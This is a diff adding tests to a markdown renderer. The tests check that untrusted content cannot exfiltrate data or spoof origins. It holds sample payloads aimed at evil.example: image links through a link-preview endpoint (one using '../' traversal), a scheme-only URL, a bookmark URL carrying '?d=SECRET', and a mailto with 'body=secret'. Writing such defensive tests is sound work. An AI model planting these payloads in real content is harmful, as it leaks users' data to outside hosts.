@@ -2108,3 +2108,75 @@ test("link domains are off unless asked for", async () => {
     screen.container.querySelector('[data-slot="markdown-link-domain"]'),
   ).toBeNull();
 });
+
+test("untrusted content loads nothing on this site unless its path is listed", async () => {
+  const image = "![Plan](/api/v1/link-preview?url=https://evil.example/)";
+  const screen = await render(<MarkdownView untrusted>{image}</MarkdownView>);
+  expect(screen.container.querySelector("img")).toBeNull();
+  expect(
+    screen.container.querySelector('[data-slot="markdown-image-blocked"]')
+      ?.textContent,
+  ).toBe("Image blocked · Plan");
+  await screen.rerender(
+    <MarkdownView untrusted allowedImagePaths={["/files/"]}>
+      {"![](/files/a.png)"}
+    </MarkdownView>,
+  );
+  expect(screen.container.querySelector("img")).not.toBeNull();
+  await screen.rerender(
+    <MarkdownView untrusted allowedImagePaths={["/files/"]}>
+      {"![](/files/../api/v1/link-preview)"}
+    </MarkdownView>,
+  );
+  expect(screen.container.querySelector("img")).toBeNull();
+});
+
+test("untrusted, a box names the real origin and a scheme-only source can't slip through", async () => {
+  const screen = await render(
+    <MarkdownView untrusted allowedImageOrigins={["*"]}>
+      {"![Image from acme.com](https://evil.example/p.png)"}
+    </MarkdownView>,
+  );
+  expect(
+    screen.container.querySelector('[data-slot="markdown-image-blocked"]')
+      ?.textContent,
+  ).toBe("Image from evil.example · Image from acme.com");
+  await screen.rerender(
+    <MarkdownView untrusted>{"![](https:evil.example/p.png)"}</MarkdownView>,
+  );
+  expect(screen.container.querySelector("img")).toBeNull();
+});
+
+test("an untrusted bookmark fetches no preview; a trusted one does", async () => {
+  const { InlineChipProvider } = await import("./inline-chip");
+  const linkPreview = vi.fn(async () => null);
+  const url = "https://evil.example/?d=SECRET";
+  const view = (untrusted: boolean) => (
+    <InlineChipProvider value={{ linkPreview }}>
+      <MarkdownView untrusted={untrusted}>
+        {`[${url}](${url} "bookmark")`}
+      </MarkdownView>
+    </InlineChipProvider>
+  );
+  const screen = await render(view(true));
+  expect(
+    screen.container.querySelector('[data-slot="markdown-bookmark"]'),
+  ).not.toBeNull();
+  await new Promise((done) => setTimeout(done, 50));
+  expect(linkPreview).not.toHaveBeenCalled();
+  await screen.unmount();
+  await render(view(false));
+  await vi.waitFor(() => expect(linkPreview).toHaveBeenCalled());
+});
+
+test("a mailto says its address when the words don't", async () => {
+  const screen = await render(
+    <MarkdownView showLinkDomains>
+      {"[Datasheet](mailto:x@evil.example?body=secret)"}
+    </MarkdownView>,
+  );
+  expect(
+    screen.container.querySelector('[data-slot="markdown-link-domain"]')
+      ?.textContent,
+  ).toBe(" (x@evil.example)");
+});
